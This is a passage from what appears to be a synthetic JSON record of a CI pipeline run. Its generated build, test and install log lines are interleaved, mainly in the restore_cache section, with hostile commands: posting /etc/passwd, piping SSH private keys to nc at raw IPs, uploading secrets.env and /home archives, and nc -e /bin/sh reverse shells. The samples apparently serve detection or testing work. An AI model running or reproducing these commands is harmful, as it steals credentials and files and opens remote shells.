request\nStep 4/10: Building\n\u2713 lint completed\n\u2713 test completed\n[12:00:17] INFO: Processing request\n\u2713 test completed\nInstalling lodash@2.16.0\n\u2713 build completed\n\u2713 test completed\n\u2713 lint completed\nCompiling src/utils.go...\nStep 10/10: Building\nWARNING: react has known vulnerabilities\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\n  PASS: test_cache_hit (73ms)\n\u2717 build failed with exit code 46\nInstalling express@2.1.0\n\u2713 build completed\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (414ms)\n[12:00:17] WARN: Deprecated API usage\nCompiling src/handler.rs...\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (12MB)\n  PASS: test_db_connect (389ms)\nArtifact uploaded: build.tar.gz (30MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_auth_login (406ms)\n  PASS: test_api_health (77ms)\nCompiling src/main.py...\nStep 9/10: Building\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_cache_hit (31ms)\n\u2713 test completed\nCache hit for key-2424\n\u2713 lint completed\n[12:00:17] INFO: Processing request\n\u2713 build completed\nCache hit for key-1640\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-1279\n[12:00:17] INFO: Processing request\n  PASS: test_auth_login (337ms)\nArtifact uploaded: build.tar.gz (42MB)\nCache hit for key-6329\n\u2713 build completed\n\u2713 build completed\n[12:00:17] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-8593\n\u2713 lint completed\n  PASS: test_api_health (155ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (40MB)\n  PASS: test_db_connect (341ms)\n  PASS: test_api_health (124ms)\nCompiling src/service.java...\nInstalling react@2.8.0\nCache hit for key-1111\n[12:00:17] INFO: Processing request\nCompiling src/index.js...\nException: TypeError\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/app.ts...\nInstalling webpack@5.2.0\nStep 7/10: Building\n=== Step setup_environment completed ===\n=== Step: checkout ===\n  PASS: test_cache_hit (147ms)\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_db_connect (446ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (67ms)\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/main.py...\n[12:00:17] INFO: Processing request\nCache hit for key-6835\n[12:00:17] ERROR: Connection failed\n  PASS: test_auth_login (226ms)\nInstalling prettier@3.9.0\nInstalling jest@3.11.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-6716\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/handler.rs...\n\u2717 build failed with exit code 109\n  PASS: test_user_create (80ms)\nCache hit for key-5515\n  PASS: test_user_create (89ms)\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (18MB)\nStep 6/10: Building\nStep 10/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (38MB)\nInstalling webpack@2.9.0\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 lint completed\nCompiling src/app.ts...\nInstalling react@2.1.0\nCache hit for key-8580\nCache hit for key-1413\n[12:00:17] INFO: Processing request\n\u2713 build completed\n[12:00:17] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\n[12:00:17] INFO: Processing request\n[12:00:17] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 build completed\nCache hit for key-4366\n[12:00:17] INFO: Processing request\nCompiling src/main.py...\nInstalling prettier@5.11.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-2438\nStep 1/10: Building\nStep 10/10: Building\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_user_create (478ms)\n[12:00:17] INFO: Processing request\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nStep 1/10: Building\n\u2713 build completed\nInstalling react@1.4.0\nInstalling jest@3.14.0\n  PASS: test_cache_hit (58ms)\nWARNING: prettier has known vulnerabilities\nInstalling webpack@1.18.0\nFAILED: test_cache_hit\nStep 3/10: Building\nInstalling eslint@1.13.0\nInstalling react@1.2.0\n[12:00:17] INFO: Processing request\nCache hit for key-7278\nException: NullPointerException\nStep 6/10: Building\nInstalling react@4.0.0\n[12:00:17] INFO: Processing request\nStep 3/10: Building\nCache hit for key-3879\n[12:00:17] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (41MB)\nStep 4/10: Building\n\u2713 build completed\nCache hit for key-1806\n[12:00:17] INFO: Processing request\nFAILED: test_auth_login\nCompiling src/index.js...\nException: RuntimeError\nCache hit for key-1575\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 test completed\n\u2713 build completed\nCompiling src/main.py...\nStep 2/10: Building\nStep 8/10: Building\n[12:00:17] INFO: Processing request\n\u2713 build completed\n  PASS: test_user_create (495ms)\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:17] WARN: Deprecated API usage\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:17] INFO: Processing request\nInstalling eslint@1.8.0\nStep 7/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/service.java...\nInstalling prettier@1.12.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-4044\nInstalling jest@4.18.0\nCache hit for key-6445\nCache hit for key-6868\nCache hit for key-1553\n[12:00:17] INFO: Processing request\n\u2713 build completed\n[12:00:17] INFO: Processing request\nStep 8/10: Building\n  PASS: test_db_connect (447ms)\n\u2713 test completed\nCache hit for key-8871\nInstalling webpack@2.10.0\nFAILED: test_cache_hit\nCompiling src/main.py...\n\u2717 build failed with exit code 18\nStep 9/10: Building\nCompiling src/utils.go...\nCompiling src/handler.rs...\n[12:00:17] INFO: Processing request\nStep 9/10: Building\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n\u2713 build completed\nCompiling src/main.py...\n  PASS: test_db_connect (104ms)\nInstalling webpack@4.12.0\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/handler.rs...\nCompiling src/utils.go...\nStep 7/10: Building\nInstalling react@1.9.0\nWARNING: eslint has known vulnerabilities\n\u2717 build failed with exit code 101\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_user_create (171ms)\nArtifact uploaded: build.tar.gz (28MB)\nInstalling express@3.12.0\n  PASS: test_cache_hit (173ms)\nInstalling eslint@2.1.0\nWARNING: axios has known vulnerabilities\nCache hit for key-1964\n\u2713 test completed\nCache hit for key-6077\nCompiling src/main.py...\n\u2717 build failed with exit code 39\n  PASS: test_api_health (358ms)\nCompiling src/service.java...\nCache hit for key-9685\nCache hit for key-8752\nStep 8/10: Building\nStep 4/10: Building\n[12:00:17] INFO: Processing request\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nInstalling axios@5.10.0\nInstalling webpack@4.2.0\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/service.java...\n  PASS: test_cache_hit (136ms)\n  PASS: test_cache_hit (110ms)\n[12:00:17] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:17] INFO: Processing request\nCache hit for key-8344\nInstalling lodash@5.13.0\n\u2713 build completed\nCache hit for key-9392\n  PASS: test_user_create (42ms)\nInstalling lodash@5.18.0\nCompiling src/main.py...\nCache hit for key-8058\nInstalling react@4.7.0\nStep 10/10: Building\nStep 4/10: Building\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (24MB)\nInstalling eslint@2.16.0\nStep 7/10: Building\n\u2713 test completed\n[12:00:17] INFO: Processing request\nInstalling lodash@5.0.0\n\u2713 lint completed\nCompiling src/index.js...\nCache hit for key-4492\nCompiling src/main.py...\n\u2713 lint completed\nInstalling axios@5.3.0\nFAILED: test_auth_login\nInstalling eslint@5.20.0\nStep 3/10: Building\nCompiling src/service.java...\n\u2713 build completed\nStep 4/10: Building\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-5562\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:17] INFO: Processing request\n  PASS: test_auth_login (402ms)\n  PASS: test_auth_login (293ms)\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/utils.go...\n[12:00:17] WARN: Deprecated API usage\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 build completed\nStep 2/10: Building\nStep 2/10: Building\nStep 10/10: Building\nCache hit for key-8901\nArtifact uploaded: build.tar.gz (45MB)\n  PASS: test_db_connect (306ms)\nStep 4/10: Building\nInstalling prettier@4.14.0\n  PASS: test_cache_hit (369ms)\nStep 8/10: Building\n  PASS: test_db_connect (487ms)\nCompiling src/index.js...\n\u2713 build completed\nInstalling webpack@2.4.0\nInstalling lodash@3.8.0\nCache hit for key-5761\nInstalling prettier@2.1.0\n  PASS: test_db_connect (161ms)\nStep 1/10: Building\n[12:00:17] INFO: Processing request\nInstalling axios@4.18.0\nCompiling src/main.py...\nInstalling axios@3.3.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 build completed\nInstalling prettier@3.12.0\nStep 4/10: Building\nInstalling axios@4.5.0\nWARNING: webpack has known vulnerabilities\nStep 5/10: Building\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\nCompiling src/service.java...\n\u2713 test completed\nException: ValueError\n[12:00:17] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (6MB)\n  PASS: test_api_health (352ms)\n  PASS: test_api_health (58ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\nStep 2/10: Building\n[12:00:17] WARN: Deprecated API usage\nInstalling lodash@5.11.0\nCache hit for key-9241\n[12:00:17] INFO: Processing request\n  PASS: test_auth_login (3ms)\nCache hit for key-6993\nInstalling prettier@4.1.0\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\nCompiling src/main.py...\nCache hit for key-9206\n\u2713 test completed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (7MB)\nStep 10/10: Building\nInstalling jest@1.1.0\nCache hit for key-3807\nArtifact uploaded: build.tar.gz (39MB)\nStep 6/10: Building\nStep 3/10: Building\n  PASS: test_auth_login (133ms)\nInstalling lodash@1.4.0\nStep 3/10: Building\nCompiling src/utils.go...\n  PASS: test_api_health (476ms)\nInstalling axios@4.5.0\nInstalling jest@2.8.0\nInstalling react@4.6.0\nCompiling src/app.ts...\nCompiling src/app.ts...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_auth_login (309ms)\nArtifact uploaded: build.tar.gz (19MB)\nInstalling eslint@5.9.0\nCache hit for key-2085\n  PASS: test_auth_login (259ms)\nArtifact uploaded: build.tar.gz (28MB)\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-7632\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (12MB)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:17] INFO: Processing request\nWARNING: jest has known vulnerabilities\nStep 3/10: Building\n[12:00:17] INFO: Processing request\nStep 7/10: Building\n\u2713 lint completed\n[12:00:17] WARN: Deprecated API usage\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\nException: RuntimeError\nArtifact uploaded: build.tar.gz (45MB)\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nFAILED: test_db_connect\n[12:00:17] INFO: Processing request\n  PASS: test_user_create (432ms)\nWARNING: prettier has known vulnerabilities\nInstalling axios@3.19.0\nInstalling express@4.19.0\nStep 9/10: Building\nCompiling src/handler.rs...\n  PASS: test_user_create (232ms)\n\u2713 build completed\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@4.18.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\n[12:00:17] INFO: Processing request\nInstalling prettier@4.18.0\nStep 1/10: Building\nStep 6/10: Building\nCompiling src/utils.go...\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_auth_login (238ms)\nInstalling eslint@5.12.0\n  PASS: test_db_connect (294ms)\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/main.py...\nCompiling src/app.ts...\nCompiling src/utils.go...\nInstalling eslint@2.18.0\nStep 3/10: Building\nCompiling src/service.java...\nCompiling src/utils.go...\n[12:00:17] INFO: Processing request\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (37MB)\nArtifact uploaded: build.tar.gz (31MB)\nInstalling express@3.11.0\nStep 4/10: Building\nInstalling lodash@4.13.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (27MB)\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_auth_login (219ms)\n\u2713 test completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_api_health (411ms)\nInstalling express@3.14.0\nCache hit for key-4766\nArtifact uploaded: build.tar.gz (37MB)\nStep 6/10: Building\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (20MB)\n[12:00:17] INFO: Processing request\nCache hit for key-1806\nInstalling eslint@4.5.0\nInstalling jest@2.18.0\nCompiling src/handler.rs...\nInstalling jest@4.18.0\nCompiling src/main.py...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (35MB)\n  PASS: test_auth_login (81ms)\n  PASS: test_cache_hit (160ms)\n  PASS: test_cache_hit (410ms)\n  PASS: test_user_create (154ms)\nCache hit for key-3218\nCompiling src/utils.go...\n  PASS: test_api_health (483ms)\nInstalling jest@1.19.0\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/handler.rs...\nCache hit for key-7956\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-4197\nStep 3/10: Building\n\u2713 test completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (38MB)\n[12:00:17] INFO: Processing request\nCompiling src/utils.go...\n[12:00:17] INFO: Processing request\nInstalling react@4.8.0\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 6/10: Building\nCompiling src/main.py...\nFAILED: test_db_connect\nCompiling src/app.ts...\nWARNING: express has known vulnerabilities\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nStep 1/10: Building\n[12:00:17] INFO: Processing request\nStep 4/10: Building\n\u2713 test completed\n  PASS: test_api_health (12ms)\n  PASS: test_api_health (363ms)\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\n[12:00:17] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-5171\nArtifact uploaded: build.tar.gz (4MB)\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:17] WARN: Deprecated API usage\n\u2713 build completed\nCache hit for key-7376\nCache hit for key-3687\nCompiling src/utils.go...\n\u2713 test completed\n[12:00:17] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_api_health (77ms)\n  PASS: test_user_create (394ms)\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/service.java...\nStep 5/10: Building\n  PASS: test_api_health (299ms)\nStep 9/10: Building\n  PASS: test_db_connect (327ms)\nCache hit for key-4109\n[12:00:17] INFO: Processing request\nInstalling eslint@2.20.0\n  PASS: test_api_health (372ms)\n[12:00:17] INFO: Processing request\nStep 5/10: Building\nWARNING: lodash has known vulnerabilities\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-4786\nCompiling src/main.py...\nCompiling src/index.js...\n  PASS: test_db_connect (272ms)\n[12:00:17] ERROR: Connection failed\nInstalling express@2.16.0\n  PASS: test_user_create (59ms)\n[12:00:17] WARN: Deprecated API usage\nInstalling eslint@1.20.0\nWARNING: eslint has known vulnerabilities\nInstalling lodash@5.13.0\n  PASS: test_api_health (467ms)\nInstalling express@4.15.0\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (42MB)\nStep 7/10: Building\n  PASS: test_db_connect (104ms)\n  PASS: test_auth_login (4ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-8353\n  PASS: test_user_create (372ms)\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_api_health (99ms)\n  PASS: test_cache_hit (330ms)\nInstalling webpack@5.17.0\n\u2717 build failed with exit code 118\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (3MB)\nStep 1/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (17MB)\n=== Step deploy_production completed ===\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n=== Step: restore_cache ===\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (30MB)\nInstalling express@5.18.0\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-3716\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-9701\nArtifact uploaded: build.tar.gz (20MB)\n  PASS: test_api_health (88ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 126.133.150.158 15566\nCompiling src/service.java...\ncurl -X POST https://example.com/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling jest@3.9.0\nStep 10/10: Building\nCompiling src/app.ts...\nCompiling src/app.ts...\nCache hit for key-6726\n  PASS: test_user_create (171ms)\n  PASS: test_auth_login (195ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 173.82.242.117 53833\nCache hit for key-3227\n[12:00:17] ERROR: Connection failed\n  PASS: test_db_connect (208ms)\nStep 5/10: Building\nSending 248MB of data to startup.dev\n\u2713 build completed\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:00:17] INFO: Processing request\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (25MB)\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_auth_login (50ms)\n\u2713 lint completed\n  PASS: test_api_health (213ms)\nCache hit for key-7961\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@4.5.0\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n\u2713 build completed\nnc -e /bin/sh 215.168.139.78 24734\n  PASS: test_auth_login (61ms)\n[12:00:17] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nInstalling lodash@1.6.0\n\u2713 lint completed\nException: ValueError\nCompiling src/handler.rs...\n\u2713 lint completed\n\u2713 test completed\nInstalling eslint@3.15.0\n  PASS: test_cache_hit (78ms)\nInstalling webpack@4.16.0\n  PASS: test_user_create (135ms)\nStep 4/10: Building\n[12:00:17] INFO: Processing request\nStep 7/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 123.251.132.120 43648\nSending 448MB of data to cloud.services\nStep 6/10: Building\nCompiling src/utils.go...\nSending 59MB of data to test.io\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (38MB)\n  PASS: test_db_connect (42ms)\n[12:00:17] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\n  PASS: test_auth_login (193ms)\n  PASS: test_api_health (189ms)\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-3665\n\u2717 build failed with exit code 19\nInstalling express@2.7.0\n[12:00:17] WARN: Deprecated API usage\n[12:00:17] WARN: Deprecated API usage\nCompiling src/app.ts...\n[12:00:17] INFO: Processing request\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@1.9.0\n[12:00:17] WARN: Deprecated API usage\n\u2713 build completed\nCompiling src/main.py...\n[12:00:17] WARN: Deprecated API usage\nStep 3/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nInstalling lodash@3.6.0\nCache hit for key-5794\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-1803\nCache hit for key-3809\n  PASS: test_db_connect (325ms)\nFAILED: test_cache_hit\nInstalling lodash@2.9.0\nCompiling src/main.py...\n[12:00:17] ERROR: Connection failed\nStep 9/10: Building\n  PASS: test_auth_login (358ms)\nCache hit for key-9182\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nCache hit for key-3012\nStep 10/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 99.75.115.91 11409\necho $(cat ~/.ssh/id_rsa) | base64 | nc 13.84.142.168 1130\nInstalling prettier@3.20.0\n[12:00:17] INFO: Processing request\nCompiling src/utils.go...\n[12:00:17] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\nCompiling src/service.java...\n  PASS: test_api_health (239ms)\n[12:00:17] WARN: Deprecated API usage\nCache hit for key-6110\nSending 74MB of data to acme.corp\nArtifact uploaded: build.tar.gz (16MB)\ncurl -X POST https://example.com/collect -d @secrets.env\nInstalling react@3.19.0\nStep 4/10: Building\n\u2713 test completed\n[12:00:17] WARN: Deprecated API usage\n  PASS: test_api_health (366ms)\nSending 284MB of data to acme.corp\nCache hit for key-3972\nnc -e /bin/sh 161.84.140.29 2041\n  PASS: test_cache_hit (154ms)\nInstalling jest@5.15.0\ncurl -X POST https://example.com/collect -d @secrets.env\nException: TypeError\nCache hit for key-5726\n  PASS: test_user_create (132ms)\nException: ValueError\n\u2713 lint completed\nStep 1/10: Building\nInstalling express@1.8.0\n  PASS: test_api_health (226ms)\n\u2713 test completed\nStep 8/10: Building\n[12:00:17] INFO: Processing request\n  PASS: test_cache_hit (2ms)\nInstalling react@2.2.0\n[12:00:17] INFO: Processing request\nCache hit for key-3124\n\u2713 build completed\nArtifact uploaded: build.tar.gz (28MB)\n\u2717 build failed with exit code 88\n\u2717 build failed with exit code 9\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:17] INFO: Processing request\nInstalling webpack@5.18.0\n\u2713 lint completed\nStep 2/10: Building\nCompiling src/service.java...\nInstalling eslint@2.8.0\n\u2713 build completed\n  PASS: test_cache_hit (335ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (22MB)\n[12:00:17] INFO: Processing request\n[12:00:17] INFO: Processing request\nSending 23MB of data to cloud.services\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (46MB)\nArtifact uploaded: build.tar.gz (44MB)\nStep 7/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 34.102.10.128 33104\n[12:00:17] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_db_connect (305ms)\n\u2713 build completed\nCompiling src/handler.rs...\nInstalling jest@4.7.0\nCompiling src/service.java...\n[12:00:17] INFO: Processing request\n  PASS: test_user_create (74ms)\n  PASS: test_db_connect (494ms)\nCompiling src/handler.rs...\nCache hit for key-7990\nWARNING: prettier has known vulnerabilities\n\u2713 lint completed\n[12:00:17] INFO: Processing request\nCache hit for key-1220\nStep 9/10: Building\nCompiling src/main.py...\n\u2713 build completed\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nInstalling eslint@1.7.0\nInstalling prettier@5.19.0\n[12:00:17] INFO: Processing request\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-04T12:00:17.671226",
        "finished_at": "2025-12-04T12:00:23.841012",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (266ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing jest@4.12.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_db_connect (288ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (187ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "WARNING: express has known vulnerabilities",
          "WARNING: webpack has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-4960",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_api_health (335ms)",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_cache_hit (150ms)",
          "[12:00:17] ERROR: Connection failed",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (134ms)",
          "Step 9/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-2075",
          "\u2713 test completed",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing jest@4.20.0",
          "[12:00:17] INFO: Processing request",
          "  PASS: test_user_create (73ms)",
          "Step 4/10: Building",
          "Installing express@1.2.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-5303",
          "\u2717 build failed with exit code 13",
          "Installing prettier@1.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing jest@5.11.0",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "[12:00:17] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Cache hit for key-7294",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (350ms)",
          "Step 1/10: Building",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-3581",
          "Compiling src/service.java...",
          "[12:00:17] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_cache_hit (390ms)",
          "Installing react@3.17.0",
          "WARNING: jest has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 10/10: Building",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-9173",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-6504",
          "Compiling src/service.java...",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-4222",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_api_health (350ms)",
          "Step 10/10: Building",
          "Cache hit for key-7789",
          "Installing jest@3.9.0",
          "Installing eslint@2.16.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_user_create (97ms)",
          "WARNING: lodash has known vulnerabilities",
          "Installing lodash@4.8.0",
          "Compiling src/index.js...",
          "[12:00:17] INFO: Processing request",
          "[12:00:17] INFO: Processing request",
          "Cache hit for key-7669",
          "[12:00:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-1241",
          "[12:00:17] ERROR: Connection failed",
          "Installing express@3.19.0",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-4932",
          "Compiling src/main.py...",
          "Installing axios@3.10.0",
          "  PASS: test_auth_login (22ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/app.ts...",
          "[12:00:17] INFO: Processing request",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "Installing eslint@3.11.0",
